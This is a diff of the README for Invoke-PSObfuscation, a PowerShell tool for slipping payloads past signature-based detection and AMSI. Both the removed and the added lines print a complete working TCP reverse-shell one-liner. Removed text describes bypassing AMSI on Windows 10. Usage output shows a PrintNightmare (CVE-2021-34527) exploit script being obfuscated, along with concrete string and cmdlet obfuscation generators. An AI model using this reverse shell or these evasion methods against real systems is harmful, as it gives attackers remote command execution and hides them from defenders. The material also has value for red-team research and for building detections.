@@ -1,46 +1,26 @@
 # Invoke-PSObfuscation
 
-Where some of the common obfuscation techniques tend to add layers to encapsulate standing code, such as base64 or compression, they tend to leave the intended payload intact, which essentially introduces chokepoints. This no longer worked for me when I needed to use this, so I decided to overhaul my original implementation of Invoke-PSObfuscation. 
+Traditional obfuscation techniques tend to add layers to encapsulate standing code, such as base64 or compression. These payloads do continue to have a varied degree of success, but they have become trivial to extract the intended payload and some launchers get detected often, which essentially introduces chokepoints.
 
-This new version focuses on replacing individual components of code with alternative variations while achieving the same intended logic without encapsulating the entire payload within a single layer. More importantly, this is a PowerShell based solution that was built for and be run entirely within Kali Linux. 
+The approach this tool introduces is a methodology where you can target and obfuscated the individual components of a script with randomized variations while achieving the same intended logic without encapsulating the entire payload within a single layer.
 
 I wrote a blog piece for Offensive Security as a precursor into the techniques this tool introduces. Before venturing further, consider giving it a read first:
 https://www.offensive-security.com/offsec/powershell-obfuscation/
 
-## Updates
-
-_Known Issues_
-
-09/03/2021 - If you are trying to obfuscate an advanced payload that uses advanced functions with custom parameters and you call that function within the same script, it will replace the parameter declaration variable but will not update the named parameter. This is corrected in the next release.
-
-_Coming Soon_
-
-09/17/2021 - I am almost finished a quality of life update to make this tool easier to use. It will also include changes that will aid in obfuscating advanced payloads such as the PowerShell exploit for CVE-2021-34527.
-
-## Background
-
-PowerShell obfuscation is a topic I have always been passionate about which has largely been due to my love of brain teasers. Throughout the years, I've relied on different types of layering techniques, but I'm starting to find that they're becoming less reliable.
-
-Therefore, I started my research into different ways I could obfuscate my payloads beyond what I typically would use. To branch away from the layering techniques I relied on, I started to target individual components and all the different ways I could think of to change how they're represented. More importantly, I wanted a way that would allow me to easily target specific components so I could determine how much or how little obfuscation I needed to bypass security checks, such as AMSI.
-
-For example, as of writing this, I was able to bypass AMSI on the latest version of Windows 10 using the vanilla reverse shell just by obfuscating the cmdlet names, while leaving everything else intact. The same can be done just be changing how the namespace class names are represented as well. Although I prefer to obscure my entire payload, it was interesting to learn how little effort it took.
-
-To help explain how this approach works, I have broken it down into components and generators.
-
 ## Components
 
-Like many other programming languages, PowerShell can be broken down into many different components that make up the executable logic. This allows us to defeat signature-based detections with relative ease by changing how we represent individual components within a payload to a form an obscure or unintelligible derivative. 
+Like many other programming languages, PowerShell can be broken down into many different components that make up the executable logic. This allows us to defeat signature-based detections with relative ease by changing how we represent individual components within a payload to a form an obscure or unintelligible derivative. Keep in mind that targeting every component in complex payloads is very instrusive. This tool is built so that you can target the components you want to obfuscate in a controlled manner. 
 
 **Supported Types**
 
 * Aliases (iex)
 * Cmdlets (New-Object)
+* Comments (# and <# #>)
 * Integers (4444)
 * Methods ($client.GetStream())
 * Namespace Classes (System.Net.Sockets.TCPClient)
 * Pipes (|)
 * Pipeline Variables ($_)
-* Socket IP / Port Declaration (New-Object System.Net.Sockets.TCPClient("10.10.10.10",80))
 * Strings ("value" | 'value')
 * Variables ($client)
 
@@ -76,36 +56,20 @@ The resulting reverse shells will not work on PowerShell v2.0. _Woah, where's th
 
 ### Reverse Shell One-Liner
 
+The original release of this script included logic to ask for the intended IP and port of the listener. This wasn't too helpful and has been removed. Instead, simply just add your listener details within the payload itself, which is what most people have been doing.
+
 ```powershell
-$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient("127.0.0.1",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
-
-### Known Issues
-
-09/03/2021 - If you are trying to obfuscate an advanced payload that uses advanced functions with custom parameters and you call that function within the same script, it will replace the parameter declaration variable but will not update the named parameter. This is corrected in the next release.
 
 ## Obfuscated One-Liner
 
 ![Alt text](./screenshots/0bFu5c4t3d.jpg "0bFu5c4t3d")
 
-## Order of Operations
-
-This solution follows a very simple order of operations. Granted this might be an intimidating script to read through, the main function, Invoke-PSObfuscation, lays out how everything flows togethers.
-
-To help piece this together:
-
-1. The given payload is loaded and flattened (string arrays do not play well with regex replacements so this loads the payload as a regular string object)
-2. A regex search looks for occurrences of the targeted component and replaces each instance with a beacon value
-3. Each beacon is replaced with a new value created from its dedicated generator function
-4. Components will be targeted in the below order whether they are named explicitly or when the `-all` parameter is used.
-	* Aliases > Strings > Namespace Classes > Cmdlets > Pipes > Pipeline Variables > Variables > Methods > Integers > Socket Listener
-   
-_Note: Some functions may double dip with other values. Although, this isn't necessarily a bad thing._
-
-## Usage
+## Usage Examples
 
 ```shell
-┌──(tristram㉿kali)-[~/Obfuscation]
+┌──(tristram㉿kali)-[~]
 └─$ pwsh
 PowerShell 7.1.3
 Copyright (c) Microsoft Corporation.
@@ -113,28 +77,33 @@ Copyright (c) Microsoft Corporation.
 https://aka.ms/powershell
 Type 'help' to get help.
 
-PS /home/tristram/Obfuscation> . ./Invoke-PSObfuscation.ps1
-PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddress 127.0.0.1 -Port 4444 -All
+PS /home/tristram> . ./Invoke-PSObfuscation.ps1
+PS /home/tristram> Invoke-PSObfuscation -Path .\CVE-2021-34527.ps1 -Cmdlets -Comments -NamespaceClasses -Variables -OutFile o-printernightmare.ps1
 
      >> Layer 0 Obfuscation
      >> https://github.com/gh0x0st
 
-[*] Converting into a single line
-[*] Inserting socket beacons
-[*] Resolving aliases
-[*] Obfuscating strings
 [*] Obfuscating namespace classes
 [*] Obfuscating cmdlets
-[*] Obfuscating pipes
-[*] Obfuscating pipeline variables
 [*] Obfuscating variables
-[*] Obfuscating method invocations
-[*] Obfuscating integers
-[*] Obfuscating socket listener ip and port number
-[*] Writing payload to /home/tristram/Obfuscation/obfuscated.ps1
+[-] -DriverName is now -QhYm48JbCsqF
+[-] -NewUser is now -ybrcKe
+[-] -NewPassword is now -ZCA9QHerOCrEX84gMgNwnAth
+[-] -DLL is now -dNr
+[-] -ModuleName is now -jd
+[-] -Module is now -tu3EI0q1XsGrniAUzx9WkV2o
+[-] -Type is now -fjTOTLDCGufqEu
+[-] -FullName is now -0vEKnCqm
+[-] -EnumElements is now -B9aFqfvDbjtOXPxrR
+[-] -Bitfield is now -bFUCG7LB9gq50p4e
+[-] -StructFields is now -xKryDRQnLdjTC8
+[-] -PackingSize is now -0CB3X
+[-] -ExplicitLayout is now -YegeaeLpPnB
+[*] Removing comments
+[*] Writing payload to o-printernightmare.ps1
 [*] Done
 
-PS /home/tristram/Obfuscation> 
+PS /home/tristram> 
 ```
 
 ## Show Changes
@@ -142,7 +111,7 @@ PS /home/tristram/Obfuscation>
 One of my personal goals was to try to make it as easy I could for folks to identify how each flagged component was changed and the generator logic involved. To accomplish this, I added the `-ShowChanges` switch. This will instruct the script to output the specific generator number, the original value, and its obfuscated value to the screen. This way if you wanted to look at how it was built you could find it more easily within the main script itself.
 
 ```shell
-┌──(tristram㉿kali)-[~/Obfuscation]
+┌──(tristram㉿kali)-[~]
 └─$ pwsh 
 PowerShell 7.1.3
 Copyright (c) Microsoft Corporation.
@@ -150,19 +119,24 @@ Copyright (c) Microsoft Corporation.
 https://aka.ms/powershell
 Type 'help' to get help.
 
-PS /home/tristram/Obfuscation> . ./Invoke-PSObfuscation.ps1                                                                            
-PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddress 127.0.0.1 -Port 4444 -PipelineVariables -ShowChanges
+PS /home/tristram> . ./Invoke-PSObfuscation.ps1                                                                            
+PS /home/tristram> Invoke-PSObfuscation -Path ./revshell.ps1 -Integers -Cmdlets -Strings -ShowChanges
 
      >> Layer 0 Obfuscation
      >> https://github.com/gh0x0st
 
-[*] Converting into a single line
-[*] Inserting socket beacons
-[*] Obfuscating pipeline variables
-    Generator 1 >> $_ >> <##>$_
-    Generator 7 >> $_ >> <#09tkl2Qd1oCTfZvIigs#>$_
-[*] Restoring socket listener ip and port number without obfuscation
-[*] Writing payload to /home/tristram/Obfuscation/obfuscated.ps1
+[*] Obfuscating integers
+    Generator 2 >> 4444 >> $(0-0+0+0-0-0+0+4444)
+    Generator 1 >> 65535 >> $((65535))
+[*] Obfuscating strings
+    Generator 2 >> 127.0.0.1 >> $([char](16*49/16)+[char](109*50/109)+[char](0+55-0)+[char](20*46/20)+[char](0+48-0)+[char](0+46-0)+[char](0+48-0)+[char](0+46-0)+[char](51*49/51))
+    Generator 2 >> PS  >> $([char](1*80/1)+[char](86+83-86)+[char](0+32-0))
+    Generator 1 >> >  >> ([string]::join('', ( (62,32) |%{ ( [char][int] $_)})) | % {$_})
+[*] Obfuscating cmdlets
+    Generator 2 >> New-Object >> & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_})
+    Generator 2 >> New-Object >> & ([string]::join('', ( (78,101,119,45,79,98,106,101,99,116) |%{ ( [char][int] $_)})) | % {$_})
+    Generator 1 >> Out-String >> & (("Tpltq1LeZGDhcO4MunzVC5NIP-vfWow6RxXSkbjYAU0aJm3KEgH2sFQr7i8dy9B")[13,16,3,25,35,3,55,57,17,49] -join '')
+[*] Writing payload to /home/tristram/obfuscated.ps1
 [*] Done
 ```
 
@@ -172,23 +146,20 @@ PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddre
 <#
     .SYNOPSIS
         Transforms PowerShell scripts into something obscure, unclear, or unintelligible.
-	
+    
     .DESCRIPTION
-    	Where most obfuscation tools tend to add layers to encapsulate standing code, such as base64 or compression, 
+        Where most obfuscation tools tend to add layers to encapsulate standing code, such as base64 or compression, 
         they tend to leave the intended payload intact, which essentially introduces chokepoints. Invoke-PSObfuscation 
         focuses on replacing the existing components of your code, or layer 0, with alternative values. 
-	
+    
     .PARAMETER Path
-	A user provided PowerShell payload via a flat file.
-	
-    .PARAMETER IPAddress
-	The user provided IP address for the reverse shell listener.
-
-    .PARAMETER Port
-	The user provided port for the reverse shell listener.
-	
+        A user provided PowerShell payload via a flat file.
+    
     .PARAMETER All
-        The all switch is used to instruct the function to obfuscate each supported component.
+        The all switch is used to engage every supported component to obfuscate a given payload. This action is very intrusive
+        and could result in your payload being broken. There should be no issues when using this with the vanilla reverse
+        shell. However, it's recommended to target specific components with more advanced payloads. Keep in mind that some of 
+        the generators introduced in this script may even confuse your ISE so be sure to test properly.
         
     .PARAMETER Aliases
         The aliases switch is used to instruct the function to obfuscate aliases.
@@ -196,8 +167,11 @@ PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddre
     .PARAMETER Cmdlets
         The cmdlets switch is used to instruct the function to obfuscate cmdlets.
 
-    .PARAMETER Listener
-        The listener switch is used to instruct the function to obfuscate the listener ip and port.
+    .PARAMETER Comments
+        The comments switch is used to instruct the function to remove all comments.
+
+    .PARAMETER Integers
+        The integers switch is used to instruct the function to obfuscate integers.
 
     .PARAMETER Methods
         The methods switch is used to instruct the function to obfuscate method invocations.
@@ -221,15 +195,15 @@ PS /home/tristram/Obfuscation> Invoke-PSObfuscation -Path ./payload.ps1 -IPAddre
         The variables switch is used to instruct the function to obfuscate variables.
 
     .EXAMPLE
-	PS C:\> Invoke-PSObfuscation -Path .\payload.ps1 -IPAddress '192.168.54.197' -Port '443' -All
+        PS C:\> Invoke-PSObfuscation -Path .\revshell.ps1 -All
     
     .EXAMPLE
-        PS C:\> Invoke-PSObfuscation -Path .\payload.ps1 -IPAddress '192.168.54.197' -Port '443' -Variables -Cmdlets -OutFile newfile.ps1
-	
+        PS C:\> Invoke-PSObfuscation -Path .\CVE-2021-34527.ps1 -Cmdlets -Comments -NamespaceClasses -Variables -OutFile o-printernightmare.ps1
+    
     .OUTPUTS
-	System.String, System.String
-	
+        System.String, System.String
+    
     .NOTES
-	Additional information about the function.
+        Additional information about the function.
 #>
 ```
